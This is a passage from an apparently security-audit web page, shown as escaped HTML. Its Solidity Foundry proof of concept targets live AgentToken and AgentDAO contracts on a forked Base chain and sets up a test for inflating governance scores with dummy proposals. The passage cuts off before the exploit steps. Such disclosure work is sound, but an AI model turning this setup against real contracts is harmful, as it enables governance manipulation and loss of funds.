0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"58\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// SPDX-License-Identifier: UNLICENSED\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003epragma\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esolidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ^\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0.8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e13\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;forge-std/Test.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003einterface\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003espender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003einterface\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eIAgentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003edistributeTaxTokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eprojectTaxPendingSwap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eprojectTaxRecipient\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetProjectTaxRecipient\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eprojectTaxRecipient_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetSwapThresholdBasisPoints\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint16\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapThresholdBasisPoints_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetProjectTaxRates\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint16\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewProjectBuyTaxBasisPoints_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint16\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewProjectSellTaxBasisPoints_\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003einterface\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eIAgentDAO\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epropose\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edescription\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecastVote\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esupport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003escoreOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003econtract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDummyProposalPOC\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIAgentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0x1C4CcA7C5DB003824208aDDA61Bd749e55F463a3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIAgentDAO\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentDAO\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentDAO\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0x98cb03B06a91e32c45F4173E290732Dc4a8F41c1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBASE_RPC_URL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eenvString\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;BASE_RPC_URL\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003emakeAddr\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;user\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetUp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eforkId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreateFork\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBASE_RPC_URL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e29_225_700\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eselectFork\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eforkId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etest_dummy_proposal_to_increase_score\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan 